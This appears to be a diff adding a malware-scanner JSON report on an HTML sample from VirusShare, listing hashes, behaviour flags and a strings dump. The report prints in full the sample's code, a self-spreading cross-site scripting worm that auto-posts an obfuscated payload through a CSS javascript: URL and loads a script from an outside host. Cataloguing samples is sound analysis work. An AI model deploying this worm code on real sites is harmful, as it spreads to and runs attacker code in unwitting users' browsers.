@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "/*\n//(proof-of-concept) draugberts\n//\n// teoreetiski pats izsuuta sevi taalaak, ja lietotaajs atver veestuli\n// un ja lietotaajam ir IE. Diemzheel (?) Firefox bija paaraak gudrs,\n// man taa arii neizdevaas vinju apchakareet, par Operu nezinu.\n// Shii draugberta versija nenodarbojaas nearko kaitiigu, tikai pieraada principu!\n//\n// paldies: rem, Cmz, r21vo\n// sveicieni: r04, ziicks, wen, endrju\n//\n// luugums atstaat sho komentaaru.\n*/ \n\nfunction conv(s) {\n\tstr = s.charCodeAt(0);\n\n\tfor (i = 1; i < s.length; i++) {\n\t\tstr = str + \",\" + s.charCodeAt(i);\n\t};\n\treturn str;\n};\nfunction randomid(min_id,max_id) {\n\tvar st = max_id-min_id+1;\n\tvar rn = Math.floor(Math.random()*st+min_id); \n\treturn rn;\n};\n\nvar header_name = \"header\";\nvar header_value = \"heheeij!\";\n\nvar message_name = \"body\";\nvar message_text = \"Eu ieveertee shito beibi! .. <br /><br /> [ paarbrauc ar peli kvadraatinjam ]\";\nvar js_url = \"http://lethal.fabrika.lv/draugberts2.js\";\nvar css_msg_style = \"height:200px;width:300px;\";\nvar message = '<script src=\\\"'+js_url+'\\\"></script>';\nvar converted_msg = conv(message);\n\nvar generated = randomid(1000,550000);\nvar to_name = \"id\";\n\nvar post_url = \"showPost.php\";\n\n\ndocument.write('<form method=\"post\" name=\"msg\">');\ndocument.write('<input type=\"hidden\" value=\"'+header_value+'\" name=\"'+header_name+'\" />');\ndocument.write('<input type=\"hidden\" value=\"'+generated+'\" name=\"'+to_name+'\" />');\ndocument.write('<input type=\"hidden\" name=\"'+message_name+'\" value=\"<div style=\\'background-Image:URL(javascript:document.write(String.fromCharCode('+converted_msg+')))\\' style=\\''+css_msg_style+'\\'>'+message_text+'</div>\" />');\ndocument.write('</form>');\ndocument.msg.action = post_url;\n\ndocument.msg.submit();"
+    },
+    "filename": "VirusShare_04a5960b7ab237f3c251d42e043e0ad1",
+    "filesize": 1712,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "04a5960b7ab237f3c251d42e043e0ad1",
+        "sha1": "08ec7f81305fdccc50f0758c39110509b17c25c2",
+        "sha256": "b3a4ee223e327a3e07f603b0985f18cf3f90efad9b3998ef8f1c0756d4a2bf69"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "//(proof-of-concept) draugberts",
+            "// teoreetiski pats izsuuta sevi taalaak, ja lietotaajs atver veestuli",
+            "// un ja lietotaajam ir IE. Diemzheel (?) Firefox bija paaraak gudrs,",
+            "// man taa arii neizdevaas vinju apchakareet, par Operu nezinu.",
+            "// Shii draugberta versija nenodarbojaas nearko kaitiigu, tikai pieraada principu!",
+            "// paldies: rem, Cmz, r21vo",
+            "// sveicieni: r04, ziicks, wen, endrju",
+            "// luugums atstaat sho komentaaru.",
+            "function conv(s) {",
+            "\tstr = s.charCodeAt(0);",
+            "\tfor (i = 1; i < s.length; i++) {",
+            "\t\tstr = str + \",\" + s.charCodeAt(i);",
+            "\treturn str;",
+            "function randomid(min_id,max_id) {",
+            "\tvar st = max_id-min_id+1;",
+            "\tvar rn = Math.floor(Math.random()*st+min_id); ",
+            "\treturn rn;",
+            "var header_name = \"header\";",
+            "var header_value = \"heheeij!\";",
+            "var message_name = \"body\";",
+            "var message_text = \"Eu ieveertee shito beibi! .. <br /><br /> [ paarbrauc ar peli kvadraatinjam ]\";",
+            "var js_url = \"http://lethal.fabrika.lv/draugberts2.js\";",
+            "var css_msg_style = \"height:200px;width:300px;\";",
+            "var message = '<script src=\\\"'+js_url+'\\\"></script>';",
+            "var converted_msg = conv(message);",
+            "var generated = randomid(1000,550000);",
+            "var to_name = \"id\";",
+            "var post_url = \"showPost.php\";",
+            "document.write('<form method=\"post\" name=\"msg\">');",
+            "document.write('<input type=\"hidden\" value=\"'+header_value+'\" name=\"'+header_name+'\" />');",
+            "document.write('<input type=\"hidden\" value=\"'+generated+'\" name=\"'+to_name+'\" />');",
+            "document.write('<input type=\"hidden\" name=\"'+message_name+'\" value=\"<div style=\\'background-Image:URL(javascript:document.write(String.fromCharCode('+converted_msg+')))\\' style=\\''+css_msg_style+'\\'>'+message_text+'</div>\" />');",
+            "document.write('</form>');",
+            "document.msg.action = post_url;",
+            "document.msg.submit();"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://lethal.fabrika.lv/draugberts2.js"
+        ]
+    },
+    "time": "0:00:00.267351",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
